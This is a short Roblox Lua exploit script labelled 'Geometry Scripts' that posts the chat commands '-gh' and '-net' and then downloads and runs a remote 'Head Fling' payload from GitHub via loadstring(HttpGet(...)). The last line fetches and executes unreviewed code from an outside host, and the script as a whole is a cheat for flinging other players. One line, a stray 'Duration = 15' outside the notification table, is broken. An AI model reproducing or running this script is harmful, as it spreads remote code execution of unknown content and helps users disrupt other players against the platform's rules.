game:GetService("StarterGui"):SetCore("SendNotification", { 
	Title = "Geometry Scripts";
	Text = "NOT MADE BY ME.";
	Icon = "nil"})
Duration = 15;

local TextChatService = game:GetService("TextChatService")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local Players = game:GetService("Players")

local function SendChatMessage(message)
    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
        local textChannels = TextChatService:FindFirstChild("TextChannels")
        if textChannels then
            local rbxSystem = textChannels:FindFirstChild("RBXSystem")
            if rbxSystem then
                rbxSystem:SendAsync(message)
                return
            end
            local rbxGeneral = textChannels:FindFirstChild("RBXGeneral")
            if rbxGeneral then
                rbxGeneral:SendAsync(message)
                return
            end
        end
        warn("No suitable text channel found!")
    else
        local sayMessageRequest = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents") and ReplicatedStorage.DefaultChatSystemChatEvents:FindFirstChild("SayMessageRequest")
        if sayMessageRequest then
            sayMessageRequest:FireServer(message, "All")
        else
            local player = Players.LocalPlayer
            if player and player:FindFirstChild("Chat") then
                player:Chat(message)
            else
                warn("Legacy chat system not found!")
            end
        end
    end
end
local customMessage = "-gh 11159410305"
local netMessage = "-net"

SendChatMessage(customMessage)
SendChatMessage(netMessage)

task.wait(0.2)

loadstring(game:HttpGet("https://raw.githubusercontent.com/Abdi1515/a/refs/heads/main/Head%20Fling.txt"))()